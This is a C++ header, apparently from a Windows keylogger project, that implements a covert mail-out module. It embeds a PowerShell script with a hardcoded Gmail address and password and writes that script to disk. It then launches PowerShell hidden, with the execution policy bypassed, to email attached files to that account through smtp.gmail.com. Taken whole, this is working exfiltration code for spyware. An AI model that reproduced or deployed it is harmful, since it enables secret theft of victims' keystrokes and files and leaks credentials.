#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail{
    #define X_EM_TO "test.smtp.zcs@gmail.com"
    #define X_EM_FROM "test.smtp.zcs@gmail.com"
    #define X_EM_PASS "Test.117-42"

    const std::string &PowerShellScript =
    "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
    "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
    "  ForEach ($val in $Attachments)\r\n                    "
    "        {\r\n               "
    "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
    "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
    "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -attachment $Att "
    "-To \"" +
     std::string (X_EM_TO) +
     "\""
    " -Body $Body -Subject $Subj "
    "-password \"" +
     std::string (X_EM_PASS) +
      "\""
    " -From \"" +
     std::string (X_EM_FROM) +
    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    std::string StringReplace(std::string str, const std::string &searchPattern, const std::string &replaceWith){
        if(searchPattern.empty())return str;

        size_t pos = 0;
        while((pos = str.find(searchPattern, pos)) != std::string::npos){
            str.replace(pos, searchPattern.length(), replaceWith);
            pos += searchPattern.length();
        }
        return str;
    }

    bool CheckFileExists(const std::string &filename){
        std::ifstream fin(filename);
        return bool(fin);
    }

    bool CreateScript(){
        std::ofstream script(IO::GetPath(true)+std::string(SCRIPT_NAME));
        if(!script) return false;

        script << PowerShellScript;
        if(!script) return false;

        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, std::string &attachmenets){
        bool ok;
        ok = IO::MkDir(IO::GetPath(true));
        if(!ok) return -1; // cannot create dir

        std::string scrPath = IO::GetPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scrPath)){
            ok = CreateScript();
        }
        if(!ok)return -2; // cannot create script

        std::string param = "-ExecutionPolicy ByPass -File \"" + scrPath +
                            "\" -Sub \"" +
                            StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \"" +
                            StringReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachmenets + "\"";

        // windows api functions
        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);   // set size
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;     // prevents ps from terminating immediately
        ShExecInfo.hwnd = NULL;                         // prevents parent window from opening
        ShExecInfo.lpVerb = "open";                     // r-click open
        ShExecInfo.lpFile = "powershell";               // indicates ps over bat or something else
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;                  // no need for workingdirectory
        ShExecInfo.nShow = SW_HIDE;                     // hides the window
        ShExecInfo.hInstApp = NULL;                     // no need to handle instance

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok) return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000); // wait 7 seconds for process to end
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&](){
                                WaitForSingleObject(ShExecInfo.hProcess, 60000);
                                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
                                if((int)exit_code == STILL_ACTIVE){
                                    TerminateProcess(ShExecInfo.hProcess, 100);
                                }
                                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
                            });

        m_timer.SetRepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &attrs){
        std::string attachments {""};
        if(attrs.size() == 1U) {
            attachments = attrs.at(0);
        }else{
            for(const auto &attr : attrs){
                attachments += attr + "::";
            }
            attachments = attachments.substr(0, attachments.length() - 2); // cleanup hanging ::
        }
        return SendMail(subject, body, attachments);
    }
}

#endif // SENDMAIL_H
